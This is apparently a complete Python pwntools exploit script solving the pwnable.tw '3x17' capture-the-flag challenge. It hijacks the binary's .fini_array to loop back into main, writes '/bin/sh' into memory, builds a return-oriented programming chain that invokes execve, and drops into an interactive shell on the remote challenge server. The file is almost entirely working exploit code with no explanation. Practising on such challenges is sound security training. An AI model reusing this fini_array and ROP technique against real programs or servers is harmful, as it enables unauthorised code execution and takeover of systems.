#!/usr/bin/env python2
# -*- coding: utf-8 -*-
import sys
from pwn import *


LOCALE = './files/3x17'
REMOTE = ['chall.pwnable.tw', 10105]

context.binary = LOCALE
context.binary.checksec()

##########################################################
############## Parse command line arguments ##############
##########################################################
if len(sys.argv) > 1 and sys.argv[1] == 'remote':
    p = remote(*REMOTE)
elif len(sys.argv) > 1 and sys.argv[1] == 'locale':
    p = process(LOCALE)
else:
    print 'Usage: %s {remote|locale} [test]' % sys.argv[0]
    sys.exit(1)

if len(sys.argv) > 2 and sys.argv[2] == 'test':
    p.interactive()
    sys.exit(0)
##########################################################

def writeww(addr, data):
	p.sendlineafter('addr:', str(addr))
	p.sendafter('data:', data)


FINI_ARRAY  = 0x4b40f0
DATA_REL_RO = 0x4b4100
BSS         = 0x4b92e0
MAIN        = 0x401b6d
LOOP        = 0x402960

with log.progress('Sending payload') as l:
    writeww(FINI_ARRAY, p64(LOOP) + p64(MAIN))
    writeww(BSS, "/bin/sh\x00")
    writeww(DATA_REL_RO + 0x00, p64(0x41e4af) + p64(0x3b))  # pop rax ; ret
    writeww(DATA_REL_RO + 0x10, p64(0x401696) + p64(BSS))   # pop rdi ; ret
    writeww(DATA_REL_RO + 0x20, p64(0x406c30) + p64(0))     # pop rsi ; ret
    writeww(DATA_REL_RO + 0x30, p64(0x446e35) + p64(0))     # pop rdx ; ret
    writeww(DATA_REL_RO + 0x40, p64(0x471db5))              # syscall ; ret
    writeww(FINI_ARRAY, p64(0x401c4b))                      # leave ; ret
    l.success()

p.interactive()
p.close()
